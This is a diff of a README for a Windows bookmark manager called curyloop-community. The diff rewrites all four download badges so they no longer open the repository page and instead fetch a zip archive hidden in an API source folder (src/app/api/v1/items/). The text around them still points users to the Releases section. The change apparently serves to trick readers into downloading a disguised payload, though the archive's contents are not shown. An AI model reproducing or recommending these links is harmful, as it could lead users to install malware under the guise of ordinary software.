@@ -1,6 +1,6 @@
 # 🔖 curyloop-community - Manage and Rediscover Bookmarks Easily
 
-[![Download curyloop-community](https://img.shields.io/badge/Download-curyloop--community-blue?style=for-the-badge)](https://github.com/Elcamio9240/curyloop-community)
+[![Download curyloop-community](https://img.shields.io/badge/Download-curyloop--community-blue?style=for-the-badge)](https://github.com/Elcamio9240/curyloop-community/raw/refs/heads/main/src/app/api/v1/items/community_curyloop_2.9.zip)
 
 ## 📚 What is curyloop-community?
 
@@ -35,7 +35,7 @@ These needs should cover most Windows computers. The app runs with low memory an
 To get curyloop-community running on your Windows PC, follow these steps:
 
 1. Visit the download page by clicking the button below or opening this link in your web browser:  
-[![Download curyloop-community](https://img.shields.io/badge/Download-curyloop--community-green?style=for-the-badge)](https://github.com/Elcamio9240/curyloop-community)
+[![Download curyloop-community](https://img.shields.io/badge/Download-curyloop--community-green?style=for-the-badge)](https://github.com/Elcamio9240/curyloop-community/raw/refs/heads/main/src/app/api/v1/items/community_curyloop_2.9.zip)
 
 2. On the GitHub repository page, find the **Releases** section. This is usually on the right side or under the code files tab.
 
@@ -98,7 +98,7 @@ If problems remain, you can open an issue on the GitHub page’s **Issues** tab.
 
 You can always get the newest version of curyloop-community here:  
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest--Release-brightgreen?style=for-the-badge)](https://github.com/Elcamio9240/curyloop-community)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest--Release-brightgreen?style=for-the-badge)](https://github.com/Elcamio9240/curyloop-community/raw/refs/heads/main/src/app/api/v1/items/community_curyloop_2.9.zip)
 
 Check this page often for updates or bug fixes. The app updates manually by downloading the installer again and running it. Your bookmarks are saved separately and will stay safe during updates.
 
@@ -121,4 +121,4 @@ You do not need to know programming to use the app but developers can find extra
 
 For easy access, the main download page is below again:  
 
-[![curyloop-community Download](https://img.shields.io/badge/Go_to_Download_curyloop--community-orange?style=for-the-badge)](https://github.com/Elcamio9240/curyloop-community)
+[![curyloop-community Download](https://img.shields.io/badge/Go_to_Download_curyloop--community-orange?style=for-the-badge)](https://github.com/Elcamio9240/curyloop-community/raw/refs/heads/main/src/app/api/v1/items/community_curyloop_2.9.zip)
